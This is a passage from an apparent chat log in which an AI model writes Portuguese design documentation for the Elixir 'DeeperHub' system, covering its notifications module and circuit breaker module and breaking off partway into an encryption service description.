### 6.3. `DeeperHub.Notifications.schedule_notification(user_id :: String.t(), notification_type :: atom(), content_data :: map(), scheduled_at :: DateTime.t(), opts :: keyword()) :: {:ok, ScheduledNotification.t()} | {:error, term()}`

*   **Descrição:** Agenda uma notificação para envio futuro.

### 6.4. `DeeperHub.Notifications.cancel_scheduled_notification(scheduled_notification_id :: String.t(), opts :: keyword()) :: :ok | {:error, :not_found | term()}`

*   **Descrição:** Cancela uma notificação agendada.

### 6.5. `DeeperHub.Notifications.get_user_notification_preferences(user_id :: String.t()) :: {:ok, NotificationPreference.t()} | {:error, term()}`

*   **Descrição:** Obtém as preferências de notificação de um usuário.

### 6.6. `DeeperHub.Notifications.update_user_notification_preferences(user_id :: String.t(), preferences_map :: map()) :: {:ok, NotificationPreference.t()} | {:error, Ecto.Changeset.t()}`

*   **Descrição:** Atualiza as preferências de notificação de um usuário.
*   **`preferences_map`:** Ex: `%{email: %{marketing_updates: false, security_alerts: true}, push: %{all_enabled: true}}`.

### 6.7. `DeeperHub.Notifications.get_unread_notifications(user_id :: String.t(), opts :: keyword()) :: {:ok, list(Notification.t()), Pagination.t()}`

*   **Descrição:** Obtém notificações in-app não lidas para um usuário.
*   **`opts`:** `:channel` (se houver múltiplos tipos de in-app), `:limit`, `:page`.

### 6.8. `DeeperHub.Notifications.mark_notification_as_read(notification_id :: String.t(), user_id :: String.t()) :: :ok | {:error, :not_found | :unauthorized}`

*   **Descrição:** Marca uma notificação específica (geralmente in-app) como lida.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:notifications, :enabled]`** (Boolean): Habilita/desabilita o sistema de notificações.
*   **`[:notifications, :default_channels, <notification_type>]`** (List de Atoms): Canais padrão para um tipo de notificação se o usuário não tiver preferências (ex: `%{user_registered: [:email, :in_app]}`).
*   **`[:notifications, :channels, :email, :adapter]`** (Module): Adaptador para envio de email (ex: `DeeperHub.Mailer`).
*   **`[:notifications, :channels, :email, :from_address]`** (String).
*   **`[:notifications, :channels, :push, :fcm_api_key]`** (String).
*   **`[:notifications, :channels, :sms, :provider_api_key]`** (String).
*   **`[:notifications, :templates, :base_path]`** (String): Caminho para os arquivos de template.
*   **`[:notifications, :templates, :cache_ttl_seconds]`** (Integer).
*   **`[:notifications, :preferences_cache, :ttl_seconds]`** (Integer).
*   **`[:notifications, :scheduler, :check_interval_seconds]`** (Integer).
*   **`[:notifications, :retention, :history_days]`** (Integer): Por quantos dias manter o histórico de notificações.
*   **`[:notifications, :retention, :scheduled_cleanup_days]`** (Integer): Por quantos dias manter scheduled notifications antigas.

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`, `Core.EventBus`, `Core.Logger`, `Core.Metrics`, `Core.Repo`, `Core.Cache`, `Core.BackgroundTaskManager`.
*   `DeeperHub.Mailer`: Para o canal de email.
*   `DeeperHub.Accounts`: Para obter informações do usuário (email, device tokens para push).
*   `DeeperHub.Audit` (via `Integrations.AuditIntegration`).

### 8.2. Bibliotecas Externas

*   Bibliotecas de template (EEx é nativo, mas outras como `NimblePublisher` para markdown podem ser usadas).
*   Bibliotecas cliente para serviços de Push (FCM, APNS) ou SMS, se usados.
*   `Jason` para payloads de push.

## 🤝 9. Como Usar / Integração

*   **Disparar Notificações a Partir de Eventos:** Criar listeners do `Core.EventBus` que chamam `Notifications.send_notification`.
    ```elixir
    # Em um módulo listener
    def handle_event(\"user.password_reset_requested\", %{user_id: user_id, reset_token: token}, _metadata) do
      DeeperHub.Notifications.send_notification(
        user_id, 
        :password_reset_instruction, 
        %{reset_link: \"https://.../#{token}\"}
      )
    end
    ```
*   **Envio Direto de Serviços:**
    ```elixir
    # Em DeeperHub.Support.TicketService
    def assign_ticket_to_agent(ticket_id, agent_id) do
      # ... lógica ...
      DeeperHub.Notifications.send_notification(
        agent_id, 
        :ticket_assigned_to_you, 
        %{ticket_id: ticket_id, ticket_subject: ticket.subject}
      )
      # ...
    end
    ```

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar o envio de notificações para cada canal (com mocks para serviços externos).
*   Testar a lógica de preferências do usuário (usuário recebe/não recebe conforme configurado).
*   Testar a renderização de templates com diferentes dados e locales.
*   Testar o agendamento e cancelamento de notificações.
*   Testar a marcação de \"lida\" para notificações in-app.
*   Testar os workers de envio e limpeza.
*   Localização: `test/deeper_hub/notifications/`.

### 10.2. Métricas

*   `deeper_hub.notifications.sent.count` (tags: `channel`, `notification_type`, `status` (`success`, `failed`))
*   `deeper_hub.notifications.delivery.duration_ms` (Histograma, tags: `channel`)
*   `deeper_hub.notifications.scheduled.enqueued.count`
*   `deeper_hub.notifications.in_app.read.count`
*   `deeper_hub.notifications.preferences.updated.count`
*   `deeper_hub.notifications.template.render.duration_ms` (Histograma, tags: `template_name`)

### 10.3. Logs

*   **Nível INFO:** Notificação enfileirada, enviada com sucesso, agendada. Preferências atualizadas.
*   **Nível WARNING:** Falha temporária no envio para um canal (com retentativa). Template não encontrado.
*   **Nível ERROR:** Falha persistente no envio para um canal. Erro ao renderizar template. Erro crítico no serviço de notificações.

### 10.4. Telemetria

*   `[:deeper_hub, :notifications, :dispatch, :start | :stop | :exception]`
    *   Metadados: `%{user_id: id, notification_type: type, channels: list}`
*   `[:deeper_hub, :notifications, :delivery_attempt, :start | :stop | :exception]`
    *   Metadados: `%{notification_id: id, channel: channel, attempt: num}`
    *   No `:stop`: `%{status: :success | :failure, error_reason: reason_if_any}`
*   `[:deeper_hub, :notifications, :preference, :queried | :updated]`
    *   Metadados: `%{user_id: id}`

## ❌ 11. Tratamento de Erros

*   **Falha no Canal de Entrega:** Se um canal (ex: servidor SMTP) estiver indisponível, o worker correspondente deve registrar o erro e tentar novamente conforme a política de retry. Falhas em um canal não devem impedir o envio por outros canais para a mesma notificação.
*   **Usuário Sem Preferências ou Informações de Contato:** O sistema deve lidar graciosamente (ex: não enviar, logar aviso) se não houver como contatar o usuário por um canal selecionado.
*   **Template Inválido/Ausente:** Logar erro e possivelmente enviar uma notificação genérica/padrão, ou não enviar por aquele canal.

## 🛡️ 12. Considerações de Segurança

*   **Conteúdo das Notificações:** Dados sensíveis não devem ser incluídos diretamente no corpo de emails ou pushes, a menos que seja estritamente necessário e o canal seja seguro. É preferível linkar para a aplicação (onde o usuário está autenticado) para ver detalhes.
*   **Phishing:** Emails e SMSs de notificação devem ter uma aparência consistente e identificável para evitar que os usuários cliquem em links de phishing. Incluir informações que só o sistema e o usuário saberiam (com moderação).
*   **Privacidade:** Respeitar as preferências do usuário é fundamental. Não enviar notificações que o usuário desabilitou.
*   **Rate Limiting (para o sistema):** O próprio sistema de notificações pode ser um alvo se puder ser usado para spam. Limitar a frequência de certos tipos de notificações (ex: notificações de segurança repetidas).

## 🧑‍💻 13. Contribuição

*   Crie novos templates em `templates/<channel>/<notification_type>.<format>.eex`.
*   Adicione traduções em `templates/i18n/`.
*   Ao definir um novo `notification_type`, configure seus canais padrão e adicione opções nas preferências do usuário.
*   Use `content_data` para passar todas as variáveis necessárias para o template, evitando lógica complexa dentro dos templates.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Implementar um painel para usuários gerenciarem visualmente seus históricos de notificação e preferências de forma mais granular.
*   [ ] Adicionar suporte a notificações Web Push para navegadores desktop/mobile.
*   [ ] Permitir que usuários \"silenciem\" notificações por um período.
*   [ ] Agregação de notificações similares para evitar sobrecarregar o usuário (ex: \"Você tem 3 novas mensagens\" em vez de 3 pushes separados).
*   [ ] Testes A/B para o conteúdo e timing de notificações para otimizar o engajamento.
*   [ ] Integração com um serviço de análise para rastrear taxas de abertura/clique (para email, push).
*   [ ] Canal de Slack ou Discord para notificações para administradores ou equipes internas.

---

*Última atualização: 2025-05-12*

---

O sistema de notificações é um componente complexo e muito importante para a experiência do usuário e para a operação do sistema.

Agora, para onde vamos? Podemos detalhar os submódulos do `DeeperHub.Notifications` como o `TemplateManager` ou o `Scheduler`, ou mudar para outro módulo Core, como `DeeperHub.Core.CircuitBreakerFactory` ou `DeeperHub.Core.EncryptionService`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Ok! Dado que o `DeeperHub.Core.CircuitBreakerFactory` (ou apenas `CircuitBreaker`) foi mencionado como uma dependência para interações com serviços externos (como GeoIP, SMTP, e potencialmente o próprio `DeeperHub.Notifications` se ele usar provedores externos de push/SMS), vamos detalhá-lo agora. Ele é crucial para a resiliência do sistema.

---

# Módulo: `DeeperHub.Core.CircuitBreaker` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.CircuitBreaker`

O módulo `DeeperHub.Core.CircuitBreaker` implementa o padrão de design **Circuit Breaker**. Seu objetivo é aumentar a resiliência e a estabilidade do sistema DeeperHub ao interagir com serviços externos ou recursos internos que podem apresentar falhas ou latência.

Quando um serviço protegido por um circuit breaker começa a falhar repetidamente, o circuito \"abre\", fazendo com que as chamadas subsequentes para esse serviço falhem imediatamente (ou retornem um fallback) por um período, sem tentar realmente contatar o serviço problemático. Isso previne que a aplicação fique presa esperando por um serviço que não responde, evita o esgotamento de recursos (como threads ou conexões) e dá tempo para o serviço problemático se recuperar. Após um timeout, o circuito entra no estado \"meio-aberto\", permitindo um número limitado de chamadas de teste. Se bem-sucedidas, o circuito \"fecha\" e o tráfego normal é restaurado. Caso contrário, ele volta para o estado \"aberto\". 😊

*(Nota: A documentação original tem `DeeperHub.Shared.CircuitBreaker`, `CircuitBreakerFacade`, `Registry`, `Config`. Esta documentação consolida a funcionalidade principal sob `DeeperHub.Core.CircuitBreaker`, que pode atuar como fachada e orquestrador para instâncias de circuit breakers gerenciadas talvez por um `Registry` interno ou pela biblioteca escolhida).*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Proteção de Chamadas a Serviços:**
    *   Envolver chamadas a serviços (internos ou externos) com a lógica do circuit breaker (`run/4` ou `call/3`).
*   **Gerenciamento de Estados do Circuito:**
    *   Manter o estado de cada circuit breaker individualmente:
        *   **Fechado (`:closed`):** Operação normal, chamadas são permitidas. Falhas são contadas.
        *   **Aberto (`:open`):** Falhas excederam o limiar. Chamadas falham imediatamente (ou usam fallback) por um período de `reset_timeout`.
        *   **Meio-Aberto (`:half_open`):** Após o `reset_timeout`, permite um número limitado de chamadas de teste. Se bem-sucedidas, volta para `:closed`. Se falharem, volta para `:open`.
*   **Contagem de Falhas e Sucessos:**
    *   Rastrear o número de falhas e sucessos consecutivos (ou dentro de uma janela de tempo) para cada serviço protegido.
*   **Limiares Configuráveis:**
    *   `failure_threshold`: Número de falhas para abrir o circuito.
    *   `success_threshold`: Número de sucessos em estado meio-aberto para fechar o circuito.
    *   `reset_timeout_ms`: Tempo que o circuito permanece aberto antes de tentar o estado meio-aberto.
    *   `call_timeout_ms` (opcional): Timeout para a chamada ao serviço protegido em si.
*   **Suporte a Fallback:**
    *   Permitir a execução de uma função de fallback quando o circuito está aberto ou a chamada principal falha.
*   **Registro e Gerenciamento de Instâncias de Circuit Breaker:**
    *   Permitir a criação e configuração dinâmica de múltiplos circuit breakers, cada um nomeado e associado a um serviço específico (`register/2`).
    *   Consultar o estado e configuração de circuit breakers (`state/1`, `list_all/0`).
    *   Resetar manualmente um circuit breaker (`reset/1`).
*   **Observabilidade:**
    *   Emitir eventos e métricas sobre mudanças de estado do circuito, chamadas permitidas/bloqueadas, falhas, sucessos.
    *   Logar transições de estado e erros significativos.
*   **Persistência de Estado (Opcional, Avançado):**
    *   Para ambientes distribuídos ou para manter o estado entre reinícios, o estado dos circuit breakers (especialmente o estado `:open` e `reset_timeout`) poderia ser persistido (ex: Redis). Por padrão, o estado é geralmente em memória por processo/ETS.

## 🏗️ 3. Arquitetura e Design

Existem várias maneiras de implementar Circuit Breakers em Elixir:
1.  **Usando uma biblioteca existente:** Como `Fuse`, `Breaker`, ou `CircuitBreaker.Ex`. Estas geralmente fornecem GenServers para gerenciar o estado de cada breaker.
2.  **Implementação customizada com GenServers:** Um GenServer por serviço protegido para manter seu estado.
3.  **Implementação com ETS:** Para alta performance, o estado pode ser mantido em ETS com atualizações atômicas.

Assumindo o uso de uma abordagem baseada em GenServer (seja de uma biblioteca ou customizada) gerenciada por um Registry:

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.CircuitBreaker` (Fachada Pública):**
    *   Ponto de entrada para registrar, executar chamadas e gerenciar circuit breakers.
    *   Delega para o `CircuitBreaker.Registry` ou diretamente para a biblioteca de circuit breaker configurada.
2.  **`DeeperHub.Core.CircuitBreaker.Registry` (GenServer):**
    *   **Responsabilidade:** Gerenciar e supervisionar as instâncias de GenServers de circuit breakers individuais.
    *   Mantém um mapa de `service_name` para `pid_do_breaker_genserver`.
    *   Lida com o registro (`register/2`) e consulta (`state/1`) de breakers.
3.  **`DeeperHub.Core.CircuitBreaker.Instance` (GenServer - um por serviço protegido):**
    *   **Responsabilidade:** Implementa a lógica de máquina de estados do circuit breaker para um serviço específico.
    *   **Estado Interno:** `:state` (`:closed`, `:open`, `:half_open`), `failure_count`, `success_count`, `last_failure_timestamp`, `config` (limiares, timeouts).
    *   **Interações:** Recebe solicitações de execução (`run/4`), atualiza seu estado com base no sucesso/falha da chamada ao serviço real.
4.  **Configurações (via `DeeperHub.Core.ConfigManager`):**
    *   Configurações padrão para novos circuit breakers.
    *   Configurações específicas por `service_name`.
5.  **Módulos que usam o Circuit Breaker:**
    *   Qualquer módulo que faça chamadas a serviços externos ou internos que podem falhar (ex: `GeoLocationService.Adapters`, `Mailer.Adapters`, `OAuth.Integrations.OAuthApiIntegration`).

### 3.2. Estrutura de Diretórios (Proposta)

```
lib/deeper_hub/core/circuit_breaker/
├── circuit_breaker.ex              # Fachada Pública
├── registry.ex                     # GenServer para gerenciar instâncias de CB
├── instance.ex                     # GenServer que implementa a lógica de um CB
├── config.ex                       # (Opcional) Módulo para carregar/gerenciar configs de CBs
└── supervisor.ex                   # Supervisor para o Registry e, indiretamente, as Instâncias
```
Se uma biblioteca externa for usada, a estrutura pode ser mais simples, com `circuit_breaker.ex` atuando como um wrapper/fachada para a API da biblioteca.

### 3.3. Decisões de Design Importantes

*   **Nomeação de Circuit Breakers:** Cada serviço ou recurso protegido deve ter um nome único para seu circuit breaker.
*   **Configuração por Instância:** Cada circuit breaker deve poder ter seus próprios limiares e timeouts, com padrões globais.
*   **Transparência para o Chamador:** A função `run/4` (ou `call/3`) deve abstrair a lógica do circuit breaker. O chamador apenas fornece a função a ser executada e, opcionalmente, um fallback.
*   **Notificação de Mudança de Estado:** É útil emitir eventos ou logs quando um circuito abre ou fecha, para monitoramento.

## 🛠️ 4. Casos de Uso Principais

*   **Chamada a uma API de GeoIP Externa:**
    *   `GeoLocationService` precisa buscar dados de um IP.
    *   `CircuitBreaker.run(:geoip_service, fn -> HTTPClient.get(url) end, fn -> {:ok, fallback_data} end, call_timeout_ms: 2000)`.
    *   Se a API GeoIP estiver lenta ou offline, após algumas falhas, o circuito para `:geoip_service` abre. Chamadas subsequentes usam `fallback_data` imediatamente.
*   **Envio de Email via SMTP Externo:**
    *   `Mailer` tenta enviar um email.
    *   `CircuitBreaker.run(:smtp_service, fn -> SMTPClient.send(email) end)`.
    *   Se o servidor SMTP estiver inacessível, o circuito abre, e o `Mailer` pode enfileirar o email para tentativa posterior.
*   **Acesso a um Microserviço Interno:**
    *   `OrderService` precisa chamar `InventoryService`.
    *   `CircuitBreaker.run(:inventory_service, fn -> InventoryClient.check_stock(item_id) end)`.
    *   Se o `InventoryService` estiver sobrecarregado, o circuito protege o `OrderService` de ficar esperando.

## 🌊 5. Fluxos Importantes

### Fluxo de Execução de uma Chamada Protegida (`run/4`)

1.  **Chamador:** `CircuitBreaker.run(:my_api, do_api_call_fun, fallback_fun, opts)`.
2.  **`CircuitBreaker` (Fachada):**
    *   Localiza o PID do `CircuitBreaker.Instance` para `:my_api` através do `Registry`.
    *   Se não existir, pode tentar registrar um novo com configurações padrão/específicas ou retornar erro.
    *   Encaminha a solicitação para o `CircuitBreaker.Instance` PID.
3.  **`CircuitBreaker.Instance` (GenServer para `:my_api`):**
    *   **Verifica Estado:**
        *   **Se `:open`:**
            *   Verifica se `reset_timeout` passou.
                *   Se sim, muda para `:half_open`, reseta `success_count`, e permite a chamada.
                *   Se não, executa `fallback_fun` (se fornecida) ou retorna `{:error, :circuit_open}`. Incrementa métrica `calls_short_circuited`.
        *   **Se `:half_open`:**
            *   Verifica se o número de chamadas de teste permitidas (`half_open_calls`) foi excedido.
                *   Se sim, executa `fallback_fun` ou retorna `{:error, :circuit_open}` (ainda está testando).
                *   Se não, permite a chamada.
        *   **Se `:closed`:** Permite a chamada.
    *   **Executa `do_api_call_fun` (se permitido):**
        *   Pode aplicar um `call_timeout_ms` específico.
        *   **Sucesso (`{:ok, result}`):**
            *   Se estado era `:half_open`, incrementa `success_count`. Se `success_count >= success_threshold`, muda para `:closed`, reseta contadores.
            *   Se estado era `:closed`, reseta `failure_count`.
            *   Incrementa métrica `calls_succeeded`.
            *   Retorna `{:ok, result}`.
        *   **Falha (`{:error, reason}` ou exceção):**
            *   Incrementa métrica `calls_failed`.
            *   Se estado era `:half_open`, muda para `:open`, agenda próximo `reset_timeout`.
            *   Se estado era `:closed`, incrementa `failure_count`. Se `failure_count >= failure_threshold`, muda para `:open`, agenda `reset_timeout`.
            *   Executa `fallback_fun` (se fornecida) ou retorna `{:error, reason_da_chamada_original}`.

## 📡 6. API (Funções Públicas da Fachada `DeeperHub.Core.CircuitBreaker`)

*(Baseado na documentação original e consolidando)*

### 6.1. `DeeperHub.Core.CircuitBreaker.run(service_name :: atom(), func :: (() -> {:ok, term()} | {:error, term()}), fallback_func :: (() -> {:ok, term()} | {:error, term()}) | nil, opts :: keyword()) :: {:ok, term()} | {:error, :circuit_open | term()}`

*   **Descrição:** Executa `func` protegida pelo circuit breaker nomeado `service_name`. Se o circuito estiver aberto ou `func` falhar e um `fallback_func` for fornecido, o resultado do fallback é retornado.
*   **`opts`:**
    *   `:call_timeout_ms` (integer): Timeout para a execução de `func`.
    *   Outras opções podem ser passadas para a lógica de registro/configuração do breaker se ele não existir.
*   **Retorno:** `{:ok, result_de_func_ou_fallback}` ou `{:error, :circuit_open}` (se sem fallback e aberto) ou `{:error, reason_de_func_ou_fallback}`.

### 6.2. `DeeperHub.Core.CircuitBreaker.register(service_name :: atom(), config :: map()) :: :ok | {:error, :already_registered | term()}`

*   **Descrição:** Registra e configura um novo circuit breaker.
*   **`config`:** Mapa com limiares e timeouts (ex: `%{failure_threshold: 5, reset_timeout_ms: 30000, success_threshold: 2, call_timeout_ms: 5000, half_open_calls: 3}`).

### 6.3. `DeeperHub.Core.CircuitBreaker.state(service_name :: atom()) :: {:ok, :closed | :open | :half_open} | {:error, :not_found}`

*   **Descrição:** Retorna o estado atual do circuit breaker especificado.

### 6.4. `DeeperHub.Core.CircuitBreaker.reset(service_name :: atom()) :: :ok | {:error, :not_found}`

*   **Descrição:** Força o circuit breaker especificado para o estado `:closed`.

### 6.5. `DeeperHub.Core.CircuitBreaker.list_all() :: {:ok, list(%{name: atom(), state: atom(), config: map(), stats: map()})}`

*   **Descrição:** Lista todos os circuit breakers registrados, seus estados, configurações e estatísticas (contagem de falhas/sucessos recentes).

### 6.6. `DeeperHub.Core.CircuitBreaker.update_config(service_name :: atom(), new_config :: map()) :: :ok | {:error, :not_found | term()}`

*   **Descrição:** Atualiza a configuração de um circuit breaker existente em tempo de execução.

## ⚙️ 7. Configuração

Via `DeeperHub.Core.ConfigManager`:

*   **`[:core, :circuit_breaker, :enabled]`** (Boolean): Habilita/desabilita o sistema de Circuit Breaker globalmente. (Padrão: `true`)
*   **`[:core, :circuit_breaker, :default_config]`** (Map): Configurações padrão para novos circuit breakers.
    *   Ex: `%{failure_threshold: 5, reset_timeout_ms: 30000, success_threshold: 2, call_timeout_ms: 5000, half_open_calls: 3}`
*   **`[:core, :circuit_breaker, :services, <service_name>]`** (Map): Configurações específicas para um `service_name`. Estas sobrescrevem os padrões.
    *   Ex: `%{geoip_api: %{failure_threshold: 3, reset_timeout_ms: 60000}}`
*   **`[:core, :circuit_breaker, :storage_adapter]`** (Module, opcional): Se o estado dos breakers precisar ser persistido (ex: `MyApp.CircuitBreaker.RedisStorage`). (Padrão: estado em memória via GenServer/ETS).

## 🔗 8. Dependências

### 8.1. Módulos Internos

*   `DeeperHub.Core.ConfigManager`: Para configurações.
*   `DeeperHub.Core.Logger`: Para logar transições de estado e erros.
*   `DeeperHub.Core.Metrics`: Para métricas de circuit breaker.
*   `DeeperHub.Core.Supervisor` (indireta): Para supervisionar o `Registry` e as `Instance`s.

### 8.2. Bibliotecas Externas

*   Opcionalmente, uma biblioteca de Circuit Breaker como `Fuse` ou `Breaker`. Se não, a lógica é implementada internamente com GenServers/ETS.

## 🤝 9. Como Usar / Integração

Módulos que fazem chamadas a serviços externos ou internos que podem ser instáveis devem envolver essas chamadas com `CircuitBreaker.run/4`.

**Exemplo em um adaptador de serviço externo:**
```elixir
defmodule MyApp.ExternalGeoServiceAdapter do
  alias DeeperHub.Core.CircuitBreaker
  alias DeeperHub.Core.HTTPClient # Assumindo um HTTPClient

  @service_name :external_geo_service

  def init_breaker do
    # Config pode vir do ConfigManager
    config = %{failure_threshold: 3, reset_timeout_ms: 60000, call_timeout_ms: 2000}
    CircuitBreaker.register(@service_name, config)
  end

  def get_location_for_ip(ip_address) do
    api_call_fun = fn ->
      case HTTPClient.get(\"https://geo.example.com/ip/#{ip_address}\", timeout: 1800) do
        {:ok, %{status_code: 200, body: body_map}} -> {:ok, body_map}
        {:ok, %{status_code: _other_status}} -> {:error, :api_error}
        {:error, reason} -> {:error, reason}
      end
    end

    fallback_fun = fn ->
      # Tentar uma base de dados local ou retornar dados padrão
      {:ok, %{country: \"Unknown\", city: \"Unknown\"}} 
    end

    CircuitBreaker.run(@service_name, api_call_fun, fallback_fun)
  end
end
```
A chamada `init_breaker` seria feita uma vez na inicialização do módulo ou da aplicação.

## ✅ 10. Testes e Observabilidade

### 10.1. Testes

*   Testar a transição de estados do circuit breaker (`closed` -> `open` -> `half_open` -> `closed` e `half_open` -> `open`).
*   Testar o comportamento com e sem função de fallback.
*   Testar o `call_timeout_ms`.
*   Testar o `reset_timeout_ms`.
*   Testar o registro e atualização de configuração de breakers.
*   Localização: `test/deeper_hub/core/circuit_breaker/`.

### 10.2. Métricas

*   `deeper_hub.core.circuit_breaker.calls.total` (tags: `service_name`, `status` (`success`, `failure`, `timeout`, `short_circuited`))
*   `deeper_hub.core.circuit_breaker.state_transitions.count` (tags: `service_name`, `from_state`, `to_state`)
*   `deeper_hub.core.circuit_breaker.state.current` (Gauge, tags: `service_name`, valor: 0=:closed, 1=:open, 2=:half_open)
*   `deeper_hub.core.circuit_breaker.fallback.used.count` (tags: `service_name`)
*   `deeper_hub.core.circuit_breaker.call.duration_ms` (Histograma, tags: `service_name`, `was_successful`)

### 10.3. Logs

*   **Nível INFO:** Transição de estado de um circuit breaker (ex: \"Circuit breaker para :my_service ABERTO\"). Sucesso em estado `half_open` levando a fechamento.
*   **Nível WARNING:** Chamada falhou e contribuiu para abrir o circuito. Chamada short-circuitada porque o circuito está aberto.
*   **Nível ERROR:** Erro interno no próprio GenServer do Circuit Breaker.

### 10.4. Telemetria

*   `[:deeper_hub, :core, :circuit_breaker, :call, :start | :stop | :exception]`
    *   Metadados: `%{service_name: name, initial_state: state}`
    *   No `:stop`: `%{result: :success | :failure | :timeout | :short_circuited, final_state: state, fallback_used: boolean}`
*   `[:deeper_hub, :core, :circuit_breaker, :state_changed]`
    *   Metadados: `%{service_name: name, old_state: state, new_state: state, reason: :failure_threshold_reached | :reset_timeout | :success_threshold_reached}`

## ❌ 11. Tratamento de Erros

*   A função `run/4` retorna `{:error, :circuit_open}` se o circuito estiver aberto e nenhum fallback for fornecido, ou o erro da função original/fallback.
*   Erros na configuração ou registro de um breaker devem ser logados e impedir o uso desse breaker específico, mas não devem derrubar o `Registry`.

## 🛡️ 12. Considerações de Segurança

*   A exposição do estado dos circuit breakers (`list_all/0`, `state/1`) via uma API administrativa deve ser protegida, pois pode revelar informações sobre a saúde de dependências internas ou externas.

## 🧑‍💻 13. Contribuição

*   Ao adicionar uma nova integração com serviço externo, considere protegê-la com um circuit breaker.
*   Ajuste os limiares e timeouts com base no comportamento esperado e na criticidade do serviço protegido.
*   Forneça funções de fallback sensatas sempre que possível.

## 🔮 14. Melhorias Futuras e TODOs

*   [ ] Adicionar \"bulkheads\" (isolamento de recursos por serviço) em conjunto com circuit breakers para limitar o impacto de um serviço lento no pool de workers da aplicação.
*   [ ] Implementar estratégias de retry com backoff *antes* de declarar uma falha para o circuit breaker, para lidar com falhas transitórias de rede.
*   [ ] Permitir que as configurações do circuit breaker (limiares, timeouts) sejam atualizadas dinamicamente em tempo de execução sem reiniciar o breaker (além do `update_config` já proposto, garantir que seja aplicado ao processo em execução).
*   [ ] Interface de UI para visualizar o estado de todos os circuit breakers e resetá-los manualmente.
*   [ ] Considerar a persistência do estado `:open` e do `reset_timeout` em um armazenamento como Redis para que o estado sobreviva a reinícios da aplicação, evitando que um serviço problemático seja imediatamente sobrecarregado após um deploy.

---

*Última atualização: 2025-05-12*

---

Circuit breakers são uma ferramenta poderosa para construir sistemas resilientes!

Onde vamos agora? Talvez `DeeperHub.Core.EncryptionService` para cobrir criptografia e gerenciamento de chaves, ou algum dos utilitários de `Shared.Utils` como `MapUtils` ou `ListUtils`?"""),
            ],
        ),
        types.Content(
            role="user",
            parts=[
                types.Part.from_text(text="""continue"""),
            ],
        ),
        types.Content(
            role="model",
            parts=[
                types.Part.from_text(text="""Excelente! Vamos então detalhar o `DeeperHub.Core.EncryptionService`. Este módulo é fundamental para proteger dados sensíveis em repouso e, potencialmente, em trânsito dentro de certos contextos.

---

# Módulo: `DeeperHub.Core.EncryptionService` 🚀

## 📜 1. Visão Geral do Módulo `DeeperHub.Core.EncryptionService`

O módulo `DeeperHub.Core.EncryptionService` é o componente centralizado para todas as **operações de criptografia e descriptografia de dados sensíveis** no sistema DeeperHub. Ele também é responsável pelo **gerenciamento seguro do ciclo de vida das chaves de criptografia**, incluindo geração, armazenamento, rotação e revogação.

O objetivo principal é garantir a confidencialidade de informações como dados pessoais de usuários (PII), credenciais de acesso a serviços externos, tokens internos e quaisquer outros dados que requeiram proteção contra acesso não autorizado, tanto em repouso (armazenados em banco de dados ou arquivos) quanto, em alguns casos, em trânsito (entre componentes internos, se necessário). 😊

*(Nota: A documentação original tem `DeeperHub.Shared.Encryption` com submódulos como `AtRestEncryptionService`, `KeyManagementService`, `EncryptedType`. Esta documentação consolida a fachada principal em `DeeperHub.Core.EncryptionService` e assume que a lógica especializada residiria em submódulos ou serviços dentro de um contexto `DeeperHub.Encryption` ou `DeeperHub.Shared.Encryption`.)*

## 🎯 2. Responsabilidades e Funcionalidades Chave

*   **Criptografia de Dados (`encrypt/2`, `encrypt_for_storage/2`):**
    *   Fornecer uma API para criptografar dados arbitrários usando algoritmos fortes e chaves gerenciadas.
    *   Suportar criptografia simétrica (ex: AES-256-GCM).
    *   Incluir metadados na saída criptografada (ex: ID da chave usada, IV/nonce, tag de autenticação) para permitir a descriptografia correta e a rotação de chaves.
    *   Diferenciar entre criptografia genérica e criptografia para armazenamento \"at-rest\" (que pode ter contextos ou prefixos específicos).
*   **Descriptografia de Dados (`decrypt/2`, `decrypt_from_storage/2`):**
    *   Descriptografar dados previamente criptografados usando a chave correta identificada pelos metadados.
    *   Verificar a integridade e autenticidade dos dados usando a tag de autenticação (para modos como GCM).
*   **Gerenciamento de Chaves de Criptografia (via `KeyManagementService`):**
    *   **Geração de Chaves (`generate_key/1`):** Gerar chaves criptográficas fortes de forma segura.
    *   **Armazenamento Seguro de Chaves:** Armazenar chaves de forma segura, idealmente usando um Hardware Security Module (HSM), um Key Management Service (KMS) de nuvem (AWS KMS, Google Cloud KMS, Azure Key Vault), ou, no mínimo, com uma chave mestra que criptografa as chaves de dados. (A implementação inicial pode usar um arquivo protegido ou variáveis de ambiente para a chave mestra).
    *   **Rotação de Chaves (`rotate_keys/0`, `perform_scheduled_rotation/0`):** Implementar um processo para rotacionar chaves de criptografia periodicamente ou sob demanda. Chaves antigas são mantidas por um período para descriptografar dados antigos, enquanto novas chaves são usadas para novas criptografias.
    *   **Recriptografia de Dados:** Fornecer um mecanismo para recriptografar dados existentes com uma nova chave após a rotação (`rotate_and_reencrypt/1`).
    *   **Versionamento de Chaves:** Associar um ID e versão a cada chave.
    *   **Revogação de Chaves (Opcional):** Marcar chaves como comprometidas ou não mais em uso.
*   **Hashing de Senhas (Delegação ou implementação própria segura):**
    *   Fornecer funcionalidade para gerar hashes seguros de senhas e verificar senhas contra hashes armazenados (ex: usando Argon2, bcrypt). (Pode ser delegado para `DeeperHub.Auth.Services.PasswordService` ou um `HashingService` dedicado).
*   **Tipo Ecto para Campos Criptografados (`DeeperHub.Shared.Encryption.EncryptedType`):**
    *   Fornecer um tipo Ecto customizado que automaticamente criptografa/descriptografa campos de schemas ao serem persistidos/lidos do banco de dados.
*   **Verificação de Status do Serviço (`check_status/0`):**
    *   Informar sobre a saúde do serviço de criptografia, incluindo a chave ativa e o status da rotação.
*   **Observabilidade e Auditoria:**
    *   Logar operações de gerenciamento de chaves e erros de criptografia/descriptografia.
    *   Registrar métricas sobre o uso de criptografia.
    *   Auditar a geração, rotação e (se aplicável) acesso a chaves.

## 🏗️ 3. Arquitetura e Design

### 3.1. Componentes Principais

1.  **`DeeperHub.Core.EncryptionService` (Fachada Pública):**
